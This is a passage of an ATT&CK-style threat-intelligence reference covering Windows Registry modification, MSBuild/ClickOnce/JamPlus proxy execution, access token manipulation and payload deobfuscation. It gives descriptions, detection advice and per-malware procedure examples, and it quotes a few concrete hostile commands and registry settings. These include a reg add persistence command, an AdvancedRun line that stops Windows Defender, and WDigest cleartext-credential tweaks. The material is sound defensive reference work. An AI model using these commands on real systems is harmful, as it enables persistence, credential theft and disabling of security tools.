+- [S0267] FELIXROOT: FELIXROOT deletes the Registry key HKCU\Software\Classes\Applications\rundll32.exe\shell\open.
+- [S0649] SMOKEDHAM: SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.
+- [S0517] Pillowmint: Pillowmint has modified the Registry key HKLM\SOFTWARE\Microsoft\DRM to store a malicious payload.
+- [S0501] PipeMon: PipeMon has modified the Registry to store its encrypted payload.
+- [S1060] Mafalda: Mafalda can manipulate the system registry on a compromised host.
+- [G0091] Silence: Silence can create, delete, or modify a specified Registry key or value.
+- [G0092] TA505: TA505 has used malware to disable Windows Defender through modification of the Registry.
+- [S0023] CHOPSTICK: CHOPSTICK may modify Registry keys to store RC4 encrypted configuration information.
+- [S1181] BlackByte 2.0 Ransomware: BlackByte 2.0 Ransomware modifies the victim Registry to allow for elevated execution.
+- [S0697] HermeticWiper: HermeticWiper has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.
+- [S0670] WarzoneRAT: WarzoneRAT can create `HKCU\Software\Classes\Folder\shell\open\command` as a new registry key during privilege escalation.
+- [S0154] Cobalt Strike: Cobalt Strike can modify Registry values within HKEY_CURRENT_USER\Software\Microsoft\Office\\Excel\Security\AccessVBOM\ to enable the execution of additional code.
+- [G0073] APT19: APT19 uses a Port 22 malware variant to modify several Registry keys.
+- [S1201] TRANSLATEXT: TRANSLATEXT has modified the following registry key to install itself as the value, granting permission to install specified extensions: ` HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist`.
+- [S0527] CSPY Downloader: CSPY Downloader can write to the Registry under the %windir% variable to execute tasks.
+- [S0666] Gelsemium: Gelsemium can modify the Registry to store its components.
+- [S0612] WastedLocker: WastedLocker can modify registry values within the Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry key.
+- [S1059] metaMain: metaMain can write the process ID of a target process into the `HKEY_LOCAL_MACHINE\SOFTWARE\DDE\tpid` Registry value as part of its reflective loading activity.
+- [S1178] ShrinkLocker: ShrinkLocker modifies various registry keys associated with system logon and BitLocker functionality to effectively lock-out users following disk encryption.
+- [S0262] QuasarRAT: QuasarRAT has a command to edit the Registry on the victim’s machine.
+- [S0203] Hydraq: Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.
+- [S1068] BlackCat: BlackCat has the ability to add the following registry key on compromised networks to maintain persistence: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services \LanmanServer\Paramenters`
+- [G1043] BlackByte: BlackByte performed Registry modifications to escalate privileges and disable security tools.
+- [S1131] NPPSPY: NPPSPY modifies the Registry to record the malicious listener for output from the Winlogon process.
+- [S1070] Black Basta: Black Basta has modified the Registry to enable itself to run in safe mode, to change the icons and file extensions for encrypted files, and to add the malware path for persistence.
+- [S0254] PLAINTEE: PLAINTEE uses reg add to add a Registry Run key for persistence.
+- [G0030] Lotus Blossom: Lotus Blossom has installed tools such as Sagerunex by writing them to the Windows registry.
+- [S1199] LockBit 2.0: LockBit 2.0 can create Registry keys to bypass UAC and for persistence.
+- [G0047] Gamaredon Group: Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings and HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM.
+- [S0692] SILENTTRINITY: SILENTTRINITY can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).
+- [S1190] Kapeka: Kapeka writes persistent configuration information to the victim host registry.
+- [S0022] Uroburos: Uroburos can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other Uroburos components.
+- [S0579] Waterbear: Waterbear has deleted certain values from the Registry to load a malicious DLL.
+- [S0157] SOUNDBITE: SOUNDBITE is capable of modifying the Registry.
+- [C0002] Night Dragon: During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.
+- [S0332] Remcos: Remcos has full control of the Registry, including the ability to modify it.
+- [S0260] InvisiMole: InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.
+- [S0455] Metamorfo: Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.
+- [S0256] Mosquito: Mosquito can modify Registry keys under HKCU\Software\Microsoft\[dllname] to store configuration values. Mosquito also modifies Registry keys under HKCR\CLSID\...\InprocServer32 with a path to the launcher.
+- [S0560] TEARDROP: TEARDROP modified the Registry to create a Windows service for itself on a compromised host.
+- [S0142] StreamEx: StreamEx has the ability to modify the Registry.
+- [S0438] Attor: Attor's dispatcher can modify the Run registry key.
+- [S1132] IPsec Helper: IPsec Helper can make arbitrary changes to registry keys based on provided input.
+- [S0447] Lokibot: Lokibot has modified the Registry as part of its UAC bypass process.
+- [S0412] ZxShell: ZxShell can create Registry entries to enable services to run.
+- [S0356] KONNI: KONNI has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.
+- [G0102] Wizard Spider: Wizard Spider has modified the Registry key HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.
+- [G0050] APT32: APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.
+- [G0143] Aquatic Panda: Aquatic Panda modified the victim registry to enable the `RestrictedAdmin` mode feature, allowing for pass the hash behaviors to function via RDP.
+- [S0583] Pysa: Pysa has modified the registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System” and added the ransom note.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used batch files that modified registry keys.
+- [S0245] BADCALL: BADCALL modifies the firewall Registry key SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List.
+- [G1006] Earth Lusca: Earth Lusca modified the registry using the command reg add “HKEY_CURRENT_USER\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]” for persistence.
+- [S0576] MegaCortex: MegaCortex has added entries to the Registry for ransom contact information.
+- [S1058] Prestige: Prestige has the ability to register new registry keys for a new extension handler via `HKCR\.enc` and `HKCR\enc\shell\open\command`.
+- [S0511] RegDuke: RegDuke can create seemingly legitimate Registry key to store its encryption key.
+- [G0108] Blue Mockingbird: Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.
+- [S0691] Neoichor: Neoichor has the ability to configure browser settings by modifying Registry entries under `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer`.
+- [G0049] OilRig: OilRig has used reg.exe to modify system configuration.
+- [S1011] Tarrask: Tarrask is able to delete the Security Descriptor (`SD`) registry subkey in order to “hide” scheduled tasks.
+- [S0572] Caterpillar WebShell: Caterpillar WebShell has a command to modify a Registry key.
+- [S0268] Bisonal: Bisonal has deleted Registry keys to clean up its prior activity.
+- [S0467] TajMahal: TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing.
+- [S0537] HyperStack: HyperStack can add the name of its communication pipe to HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes.
+- [S0115] Crimson: Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.
+- [G1003] Ember Bear: Ember Bear modifies registry values for anti-forensics and defense evasion purposes.
+- [S0229] Orz: Orz can perform Registry operations.
+- [S0148] RTM: RTM can delete all Registry entries created during its execution.
+- [G1017] Volt Typhoon: Volt Typhoon has used `netsh` to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG).
+- [S1099] Samurai: The Samurai loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.
+- [C0014] Operation Wocao: During Operation Wocao, the threat actors enabled Wdigest by changing the `HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest` registry value from 0 (disabled) to 1 (enabled).
+- [G0035] Dragonfly: Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.
+- [S0488] CrackMapExec: CrackMapExec can create a registry key using wdigest.
+- [G0078] Gorgon Group: Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\Software\Microsoft\Office\.
+- [S0350] zwShell: zwShell can modify the Registry.
+- [S0631] Chaes: Chaes can modify Registry values to stored information and establish persistence.
+- [S0336] NanoCore: NanoCore has the capability to edit the Registry.
+- [S0611] Clop: Clop can make modifications to Registry keys.
+- [S0665] ThreatNeedle: ThreatNeedle can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon`.
+- [S0386] Ursnif: Ursnif has used Registry modifications as part of its installation routine.
+- [S0441] PowerShower: PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.
+- [S0045] ADVSTORESHELL: ADVSTORESHELL is capable of setting and deleting Registry values.
+- [S0568] EVILNUM: EVILNUM can make modifications to the Regsitry for persistence.
+- [S0330] Zeus Panda: Zeus Panda modifies several Registry keys under HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\ to disable phishing filters.
+- [S0343] Exaramel for Windows: Exaramel for Windows adds the configuration to the Registry in XML format.
+- [S0205] Naid: Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.
+- [S0140] Shamoon: Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1.
+- [S0663] SysUpdate: SysUpdate can write its configuration file to Software\Classes\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.
+- [G1014] LuminousMoth: LuminousMoth has used malware that adds Registry keys for persistence.
+- [S0385] njRAT: njRAT can create, delete, or modify a specified Registry key or value.
+- [S1047] Mori: Mori can write data to `HKLM\Software\NFC\IPA` and `HKLM\Software\NFC\` and delete Registry values.
+- [S0342] GreyEnergy: GreyEnergy modifies conditions in the Registry and adds keys.
+- [S0075] Reg: Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.
+- [S0090] Rover: Rover has functionality to remove Registry Run key persistence as a cleanup procedure.
+- [S0180] Volgmer: Volgmer modifies the Registry to store an encoded configuration file in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security.
+- [S0660] Clambling: Clambling can set and delete Registry keys.
+- [S0650] QakBot: QakBot can modify the Registry to store its configuration information in a randomly named subkey under HKCU\Software\Microsoft.
+- [S0239] Bankshot: Bankshot writes data into the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj.
+- [G0094] Kimsuky: Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence.
+- [S0126] ComRAT: ComRAT has modified Registry values to store encrypted orchestrator code and payloads.
+- [S0640] Avaddon: Avaddon modifies several registry keys for persistence and UAC bypass.
+- [S1025] Amadey: Amadey has overwritten registry keys for persistence.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware modifies the victim Registry to prevent system recovery.
+- [S0266] TrickBot: TrickBot can modify registry entries.
+- [G0096] APT41: APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.
+- [S0334] DarkComet: DarkComet adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0” and HKEY_CURRENT_USER\Software\DC3_FEXEC.
+- [G0059] Magic Hound: Magic Hound has modified Registry settings for security tools.
+- [S0263] TYPEFRAME: TYPEFRAME can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs.
+- [S1050] PcShare: PcShare can delete its persistence mechanisms from the registry.
+- [S0271] KEYMARBLE: KEYMARBLE has a command to create Registry entries for storing data under HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath.
+- [S0679] Ferocious: Ferocious has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.
+- [S1066] DarkTortilla: DarkTortilla has modified registry keys for persistence.
+- [S0348] Cardinal RAT: Cardinal RAT sets HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load to point to its executable.
+- [S0331] Agent Tesla: Agent Tesla can achieve persistence by modifying Registry key entries.
+- [S1090] NightClub: NightClub can modify the Registry to set the ServiceDLL for a service created by the malware for persistence.
+- [S0269] QUADAGENT: QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.
+- [S0198] NETWIRE: NETWIRE can modify the Registry to store its configuration information.
+- [S0589] Sibot: Sibot has modified the Registry to install a second-stage script in the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot.
+- [S0570] BitPaymer: BitPaymer can set values in the Registry to help in execution.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use the Windows Registry Environment key to change the `%windir%` variable to point to `c:\Windows` to enable payload execution.
+- [S0662] RCSession: RCSession can write its configuration file to the Registry.
+- [G1044] APT42: APT42 has modified Registry keys to maintain persistence.
+- [G1031] Saint Bear: Saint Bear will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality.
+- [S0210] Nerex: Nerex creates a Registry subkey that registers a new service.
+- [S0444] ShimRat: ShimRat has registered two registry keys for shim databases.
+- [G0027] Threat Group-3390: A Threat Group-3390 tool has created new Registry keys under `HKEY_CURRENT_USER\Software\Classes\` and `HKLM\SYSTEM\CurrentControlSet\services`.
+- [G0061] FIN8: FIN8 has deleted Registry keys during post compromise cleanup activities.
+- [S0677] AADInternals: AADInternals can modify registry keys as part of setting a new pass-through authentication agent.
+- [S0019] Regin: Regin appears to have functionality to modify remote Registry information.
+- [S0664] Pandora: Pandora can write an encrypted token to the Registry to enable processing of remote commands.
+
+
+### T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
+
+Description:
+
+Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations. Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.
+
+Procedures:
+
+- [S0013] PlugX: A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.
+- [S0363] Empire: Empire can use built-in modules to abuse trusted utilities like MSBuild.exe.
+- [C0001] Frankenstein: During Frankenstein, the threat actors used MSbuild to execute an actor-created file.
+
+### T1127.002 - Trusted Developer Utilities Proxy Execution: ClickOnce
+
+Description:
+
+Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application. Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install. As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges. ClickOnce may be abused in a number of ways. For example, an adversary may rely on User Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation. Adversaries may also abuse ClickOnce to execute malware via a Rundll32 script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`. Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., Registry Run Keys / Startup Folder).
+
+### T1127.003 - Trusted Developer Utilities Proxy Execution: JamPlus
+
+Description:
+
+Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio. Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.
+
+
+### T1134.001 - Access Token Manipulation: Token Impersonation/Theft
+
+Description:
+
+Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread. An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system. When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.
+
+Detection:
+
+If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex), ImpersonateLoggedOnUser , and SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.
+
+Procedures:
+
+- [S0182] FinFisher: FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.
+- [S0367] Emotet: Emotet has the ability to duplicate the user’s token. For example, Emotet may use a variant of Google’s ProtoBuf to send messages that specify how code will be executed.
+- [S0603] Stuxnet: Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager.
+- [C0038] HomeLand Justice: During HomeLand Justice, threat actors used custom tooling to acquire tokens using `ImpersonateLoggedOnUser/SetThreadToken`.
+- [S0154] Cobalt Strike: Cobalt Strike can steal access tokens from exiting processes.
+- [S1011] Tarrask: Tarrask leverages token theft to obtain `lsass.exe` security permissions.
+- [S0692] SILENTTRINITY: SILENTTRINITY can find a process owned by a specific user and impersonate the associated token.
+- [S0570] BitPaymer: BitPaymer can use the tokens of users to create processes on infected systems.
+- [S0140] Shamoon: Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient.
+- [S0439] Okrum: Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.
+- [S0456] Aria-body: Aria-body has the ability to duplicate a token from ntprint.exe.
+- [G0007] APT28: APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.
+- [S0496] REvil: REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.
+- [S0192] Pupy: Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.
+- [S1081] BADHATCH: BADHATCH can impersonate a `lsass.exe` or `vmtoolsd.exe` token.
+- [S0623] Siloscape: Siloscape impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread.
+- [G0061] FIN8: FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.
+
+### T1134.002 - Access Token Manipulation: Create Process with Token
+
+Description:
+
+Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas. Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process. While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.
+
+Detection:
+
+If an adversary is using a standard command-line shell (i.e. Windows Command Shell), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command or similar artifacts. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior. Analysts can also monitor for use of Windows APIs such as CreateProcessWithTokenW and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.
+
+Procedures:
+
+- [S0344] Azorult: Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.
+- [G0010] Turla: Turla RPC backdoors can impersonate or steal process tokens before executing commands.
+- [S0501] PipeMon: PipeMon can attempt to gain administrative privileges using token impersonation.
+- [G0032] Lazarus Group: Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.
+- [S0378] PoshC2: PoshC2 can use Invoke-RunAs to make tokens.
+- [S0456] Aria-body: Aria-body has the ability to execute a process using runas.
+- [S0496] REvil: REvil can launch an instance of itself with administrative rights using runas.
+- [S0412] ZxShell: ZxShell has a command called RunAs, which creates a new process as another user or process context.
+- [S0689] WhisperGate: The WhisperGate third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via `%TEMP%\AdvancedRun.exe" /EXEFilename "C:\Windows\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run`.
+- [S0356] KONNI: KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.
+- [S0239] Bankshot: Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.
+- [S0363] Empire: Empire can use Invoke-RunAs to make tokens.
+
+### T1134.003 - Access Token Manipulation: Make and Impersonate Token
+
+Description:
+
+Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread. This behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.
+
+Detection:
+
+If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. Analysts can also monitor for use of Windows APIs such as LogonUser and SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.
+
+Procedures:
+
+- [S1060] Mafalda: Mafalda can create a token for a different user.
+- [G1043] BlackByte: BlackByte constructed a valid authentication token following Microsoft Exchange exploitation to allow for follow-on privileged command execution.
+- [G1016] FIN13: FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation.
+- [S0692] SILENTTRINITY: SILENTTRINITY can make tokens from known credentials.
+- [S0154] Cobalt Strike: Cobalt Strike can make tokens from known credentials.
+
+### T1134.004 - Access Token Manipulation: Parent PID Spoofing
+
+Description:
+
+Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context. Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API. Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.
+
+Detection:
+
+Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. Monitor and analyze API calls to CreateProcess/CreateProcessA, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information). Malicious use of CreateProcess/CreateProcessA may also be proceeded by a call to UpdateProcThreadAttribute, which may be necessary to update process creation attributes. This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.
+
+Procedures:
+
+- [S0356] KONNI: KONNI has used parent PID spoofing to spawn a new `cmd` process using `CreateProcessW` and a handle to `Taskmgr.exe`.
+- [S0154] Cobalt Strike: Cobalt Strike can spawn processes with alternate PPIDs.
+- [S0501] PipeMon: PipeMon can use parent PID spoofing to elevate privileges.
+- [S1111] DarkGate: DarkGate relies on parent PID spoofing as part of its "rootkit-like" functionality to evade detection via Task Manager or Process Explorer.
+
+### T1134.005 - Access Token Manipulation: SID-History Injection
+
+Description:
+
+Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.
+
+Detection:
+
+Examine data in user’s SID-History attributes using the PowerShell Get-ADUser cmdlet , especially users who have SID-History values from the same domain. Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. Monitor for Windows API calls to the DsAddSidHistory function.
+
+Procedures:
+
+- [S0002] Mimikatz: Mimikatz's MISC::AddSid module can append any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.
+- [S0363] Empire: Empire can add a SID-History to a user if on a domain controller.
+
+
+### T1140 - Deobfuscate/Decode Files or Information
+
+Description:
+
+Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b or type command to reassemble binary fragments into a malicious payload. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.
+
+Detection:
+
+Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil. Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.
+
+Procedures:
+
+- [C0044] Juicy Mix: During Juicy Mix, OilRig used a script to concatenate and deobfuscate encoded strings in Mango.
+- [S0230] ZeroT: ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.
+- [S0584] AppleJeus: AppleJeus has decoded files received from a C2.
+- [S1028] Action RAT: Action RAT can use Base64 to decode actor-controlled C2 server communications.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER downloads encoded payloads and decodes them on the victim.
+- [S0669] KOCTOPUS: KOCTOPUS has deobfuscated itself before executing its commands.
+- [S1086] Snip3: Snip3 can decode its second-stage PowerShell script prior to execution.
+- [S0574] BendyBear: BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.
+- [S0513] LiteDuke: LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.
+- [S0598] P.A.S. Webshell: P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.
+- [S0356] KONNI: KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.
+- [G0010] Turla: Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.
+- [S0409] Machete: Machete’s downloaded data is decrypted using AES.
+- [S0415] BOOSTWRITE: BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.
+- [S1202] LockBit 3.0: The LockBit 3.0 payload is decrypted at runtime.
+- [G0087] APT39: APT39 has used malware to decrypt encrypted CAB files.
+- [S1078] RotaJakiro: RotaJakiro uses the AES algorithm, bit shifts in a function called `rotate`, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the `head` and `key` sections in the network packet structure used for C2 communications.
+- [S0284] More_eggs: More_eggs will decode malware components that are then dropped to the system.
+- [S1066] DarkTortilla: DarkTortilla can decrypt its payload and associated configuration elements using the Rijndael cipher.
+- [S0666] Gelsemium: Gelsemium can decompress and decrypt DLLs and shellcode.
+- [S0226] Smoke Loader: Smoke Loader deobfuscates its code.
+- [S1122] Mispadu: Mispadu decrypts its encrypted configuration files prior to execution.
+- [S0611] Clop: Clop has used a simple XOR operation to decrypt strings.
+- [S0461] SDBbot: SDBbot has the ability to decrypt and decompress its payload to enable code execution.
